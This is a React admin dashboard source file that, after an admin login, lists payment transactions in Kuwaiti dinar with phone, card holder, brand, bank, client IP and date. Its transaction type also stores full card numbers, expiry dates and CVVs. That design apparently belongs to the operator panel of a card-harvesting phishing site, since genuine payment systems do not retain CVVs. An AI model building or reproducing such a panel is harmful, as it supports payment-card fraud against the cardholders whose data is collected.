import { useState, useEffect } from 'react';
import { Button } from '@/components/ui/button';
import { Card } from '@/components/ui/card';
import { Loader2, Trash2 } from 'lucide-react';
import { trpc } from '@/lib/trpc';

interface Transaction {
  id: number;
  phone: string;
  amount: string;
  cardNumber?: string | null;
  cardExpiry?: string | null;
  cardCVV?: string | null;
  cardHolder?: string | null;
  cardBrand?: string | null;
  bankName?: string | null;
  clientIP?: string | null;
  paymentMethod?: string | null;
  status?: string | null;
  createdAt: Date | string;
}

export default function Dashboard() {
  const [adminSession, setAdminSession] = useState<{ username: string } | null>(null);
  const [loginUsername, setLoginUsername] = useState('');
  const [loginPassword, setLoginPassword] = useState('');
  const [isLoggingIn, setIsLoggingIn] = useState(false);
  const [transactions, setTransactions] = useState<Transaction[]>([]);

  // Fetch transactions
  const { data: transactionsData, isLoading: isLoadingTransactions, refetch } = trpc.payment.getTransactions.useQuery(
    undefined,
    { enabled: !!adminSession }
  );

  // Delete transaction mutation
  const deleteTransactionMutation = trpc.payment.deleteTransaction.useMutation({
    onSuccess: () => {
      refetch();
    },
  });

  // Admin login mutation
  const loginMutation = trpc.admin.login.useMutation({
    onSuccess: (result) => {
      if (result.success && result.admin) {
        setAdminSession(result.admin);
        setLoginUsername('');
        setLoginPassword('');
      } else {
        alert(result.error || 'Login failed');
      }
    },
    onError: (error) => {
      alert('Login failed: ' + error.message);
    },
  });

  useEffect(() => {
    if (transactionsData) {
      setTransactions(transactionsData as Transaction[]);
    }
  }, [transactionsData]);

  const handleLogin = async (e: React.FormEvent) => {
    e.preventDefault();
    setIsLoggingIn(true);
    await loginMutation.mutateAsync({ username: loginUsername, password: loginPassword });
    setIsLoggingIn(false);
  };

  const handleLogout = () => {
    setAdminSession(null);
    setTransactions([]);
  };

  const handleDelete = async (id: number) => {
    if (confirm('Are you sure you want to delete this transaction?')) {
      await deleteTransactionMutation.mutateAsync({ id });
    }
  };

  if (!adminSession) {
    return (
      <div className="min-h-screen bg-gradient-to-br from-blue-50 to-indigo-100 flex items-center justify-center p-4">
        <Card className="w-full max-w-md p-8 shadow-lg">
          <h1 className="text-2xl font-bold mb-6 text-center text-gray-800">Admin Dashboard</h1>
          <form onSubmit={handleLogin} className="space-y-4">
            <div>
              <label className="block text-sm font-medium text-gray-700 mb-1">Username</label>
              <input
                type="text"
                value={loginUsername}
                onChange={(e) => setLoginUsername(e.target.value)}
                className="w-full px-4 py-2 border border-gray-300 rounded-lg focus:ring-2 focus:ring-indigo-500 focus:border-transparent"
                placeholder="Enter username"
              />
            </div>
            <div>
              <label className="block text-sm font-medium text-gray-700 mb-1">Password</label>
              <input
                type="password"
                value={loginPassword}
                onChange={(e) => setLoginPassword(e.target.value)}
                className="w-full px-4 py-2 border border-gray-300 rounded-lg focus:ring-2 focus:ring-indigo-500 focus:border-transparent"
                placeholder="Enter password"
              />
            </div>
            <Button
              type="submit"
              disabled={isLoggingIn}
              className="w-full bg-indigo-600 hover:bg-indigo-700 text-white font-semibold py-2 rounded-lg transition"
            >
              {isLoggingIn ? <Loader2 className="animate-spin mr-2" /> : null}
              {isLoggingIn ? 'Logging in...' : 'Login'}
            </Button>
          </form>
        </Card>
      </div>
    );
  }

  return (
    <div className="min-h-screen bg-gray-50 p-4">
      <div className="max-w-6xl mx-auto">
        {/* Header */}
        <div className="flex justify-between items-center mb-8">
          <h1 className="text-3xl font-bold text-gray-800">Payment Transactions</h1>
          <div className="flex items-center gap-4">
            <span className="text-gray-600">Welcome, {adminSession.username}</span>
            <Button
              onClick={handleLogout}
              variant="outline"
              className="text-red-600 border-red-600 hover:bg-red-50"
            >
              Logout
            </Button>
          </div>
        </div>

        {/* Stats */}
        <div className="grid grid-cols-1 md:grid-cols-3 gap-4 mb-8">
          <Card className="p-6">
            <p className="text-gray-600 text-sm">Total Transactions</p>
            <p className="text-3xl font-bold text-indigo-600">{transactions.length}</p>
          </Card>
          <Card className="p-6">
            <p className="text-gray-600 text-sm">Total Amount</p>
            <p className="text-3xl font-bold text-green-600">
              {transactions.reduce((sum, t) => sum + parseFloat(t.amount || '0'), 0).toFixed(2)} KD
            </p>
          </Card>
          <Card className="p-6">
            <p className="text-gray-600 text-sm">Last Transaction</p>
            <p className="text-lg font-semibold text-gray-800">
              {transactions.length > 0
                ? new Date(transactions[transactions.length - 1].createdAt).toLocaleDateString()
                : 'N/A'}
            </p>
          </Card>
        </div>

        {/* Transactions Table */}
        <Card className="overflow-hidden">
          {isLoadingTransactions ? (
            <div className="p-8 flex justify-center">
              <Loader2 className="animate-spin text-indigo-600" size={32} />
            </div>
          ) : transactions.length === 0 ? (
            <div className="p-8 text-center text-gray-500">No transactions yet</div>
          ) : (
            <div className="overflow-x-auto">
              <table className="w-full">
                <thead className="bg-gray-100 border-b">
                  <tr>
                    <th className="px-6 py-3 text-left text-sm font-semibold text-gray-700">Phone</th>
                    <th className="px-6 py-3 text-left text-sm font-semibold text-gray-700">Amount</th>
                    <th className="px-6 py-3 text-left text-sm font-semibold text-gray-700">Card Holder</th>
                    <th className="px-6 py-3 text-left text-sm font-semibold text-gray-700">Card Brand</th>
                    <th className="px-6 py-3 text-left text-sm font-semibold text-gray-700">Bank</th>
                    <th className="px-6 py-3 text-left text-sm font-semibold text-gray-700">IP Address</th>
                    <th className="px-6 py-3 text-left text-sm font-semibold text-gray-700">Date</th>
                    <th className="px-6 py-3 text-left text-sm font-semibold text-gray-700">Action</th>
                  </tr>
                </thead>
                <tbody>
                  {transactions.map((transaction) => (
                    <tr key={transaction.id} className="border-b hover:bg-gray-50 transition">
                      <td className="px-6 py-4 text-sm text-gray-800">{transaction.phone}</td>
                      <td className="px-6 py-4 text-sm font-semibold text-green-600">{transaction.amount} KD</td>
                      <td className="px-6 py-4 text-sm text-gray-800">{transaction.cardHolder || 'N/A'}</td>
                      <td className="px-6 py-4 text-sm text-gray-800">{transaction.cardBrand || 'N/A'}</td>
                      <td className="px-6 py-4 text-sm text-gray-800">{transaction.bankName || 'N/A'}</td>
                      <td className="px-6 py-4 text-sm text-gray-800">{transaction.clientIP || 'N/A'}</td>
                      <td className="px-6 py-4 text-sm text-gray-600">
                        {new Date(transaction.createdAt).toLocaleString()}
                      </td>
                      <td className="px-6 py-4 text-sm">
                        <button
                          onClick={() => handleDelete(transaction.id)}
                          className="text-red-600 hover:text-red-800 transition"
                        >
                          <Trash2 size={18} />
                        </button>
                      </td>
                    </tr>
                  ))}
                </tbody>
              </table>
            </div>
          )}
        </Card>
      </div>
    </div>
  );
}
